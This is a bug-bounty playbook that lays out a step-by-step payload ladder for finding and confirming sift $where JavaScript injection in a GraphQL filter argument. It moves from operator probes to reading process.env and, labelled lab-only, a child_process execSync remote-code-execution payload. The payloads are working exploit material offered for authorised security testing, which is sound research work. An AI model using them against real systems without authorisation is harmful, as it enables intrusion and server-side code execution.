# Playbook: GraphQL sift $where — 1 case per test (additive ladder)

Rule: send 1 test at a time. Only go next if previous passed. Stop on fail.

## 0. Baseline
- Payload: `{"f":{"name":"no_exist_xyz123"}}`
- Expect: 0 results / empty. Save count. This is your control.

## 1. Operator parsing?
- Payload: `{"f":{"$regex":".*"}}`
- PASS if: count != baseline (more results). Means `$` operators reach DB filter.
- FAIL: same as baseline → stop, not this class.

## 2. $where accepted?
- Payload: `{"f":{"$where":"1"}}`
- PASS if: no `forbidden`, no `invalid filter`, response different from baseline (even error). Means key not stripped.
- FAIL: `400 $where not allowed` → stop, patched.

## 3. JS execution? (safe math)
- Payload: `{"f":{"$where":"(function(){throw new Error(\"PWN_\"+(6*7))})()"}}`
- PASS if: response contains `PWN_42`. = server computed 6*7.
- FAIL: no reflection → try error channel? If no output channel, mark blind, stop for now.

## 4. Context: Node.js?
- Payload: same + `+(typeof process)` → expect `PWN_42_object`
- `object` = Node (big: env, exec). `undefined` = browser sandbox (smaller: XSS-like).

## 5. Read-only impact (no shell, bounty-safe)
- Payload: `+(Object.keys(process.env).length)` or `+(process.version.length)`
- Shows you can read env without stealing secrets. Enough for Critical report.

## 6. Lab only: RCE confirm (never on prod without permission)
- Payload: `process.getBuiltinModule("child_process").execSync("id").toString()`
- Only in your own Docker / gitlab-ato-lab style env.

## Notes template per target
```
Target: /graphql field=expandScopes arg=filter type=JSON
0 baseline: ...
1 regex: PASS/FAIL -
2 where: PASS/FAIL -
3 exec: PASS/FAIL -
```

Full lesson: `2026/2026-08-05-mozilla-taskcluster-graphql-rce.md`
Original: https://hackerone.com/reports/3782701
